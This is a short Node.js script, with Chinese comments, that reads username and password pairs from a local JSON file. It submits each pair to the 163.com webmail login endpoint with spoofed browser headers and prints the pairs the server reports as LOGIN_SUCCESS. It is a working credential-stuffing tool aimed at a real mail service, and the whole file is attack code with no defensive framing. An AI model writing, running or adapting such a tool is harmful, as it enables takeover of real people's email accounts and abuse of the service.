var https=require("https");
var querystring=require("querystring");
//未登陆的账号
var noLogin = require("./demo_03_json")
//登陆成功的账号
var winLogin = []
for (var i = 0; i < noLogin.length; i++) {

var contents=querystring.stringify({
	password: noLogin[i][0],
	username: noLogin[i][1]
});
var options={
	host:"ssl.mail.163.com",
	path:"/entry/coremail/fcg/ntesdoor2?df=webmail163&from=web&funcid=loginone&iframe=1&language=-1&net=c&passtype=1&product=mail163&race=-2_60_-2_hz&style=-1&uid=******@163.com",
	method:"post",
	headers:{	
		"Content-Type":"application/x-www-form-urlencoded",
		"Content-Length":contents.length,		
		"Accept":"text/html, application/xhtml+xml, */*",	
		"Accept-Language":"zh-CN",
		"Cache-Control":"no-cache",
		"Connection":"Keep-Alive",	
		"Host":"ssl.mail.163.com",
		"Referer":"http://mail.163.com/",		
		"User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ZHCN)",
		"contents": contents,
		"len": i
	}
};

var req=https.request(options,function(res){
	res.setEncoding("utf8");
	var headers=res.headers;
	console.log(res.req._headers['len'])
	if (headers['x-ntes-mailentry-result'] === 'LOGIN_SUCCESS') {
		console.log(res.req._headers['contents'].replace("%40","@").split('&'))
	} else {
		console.log(headers['x-ntes-mailentry-result'])
	}
});
req.write(contents);
req.end();
};